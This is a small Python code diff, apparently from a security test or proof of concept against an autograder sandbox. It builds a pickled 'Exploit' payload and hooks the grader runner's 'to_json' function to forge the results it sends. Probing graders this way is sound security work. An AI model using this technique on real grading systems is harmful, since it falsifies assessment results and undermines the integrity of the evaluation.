@@ -11,7 +11,9 @@ class Exploit:
 
 
 payload = base64.b64encode(pickle.dumps(Exploit())).decode()
-runner = sys.modules["__main__"]
+# The sandbox runs this module as a spawned child, so the runner is imported under its package name
+# rather than as __main__. Reach it the way a real attacker on this runtime would.
+runner = sys.modules["pytest_prairielearn_grader._student_code_runner"]
 real_to_json = runner.to_json
 
 # Forge whatever the runner would send if it serialized setup values on request.
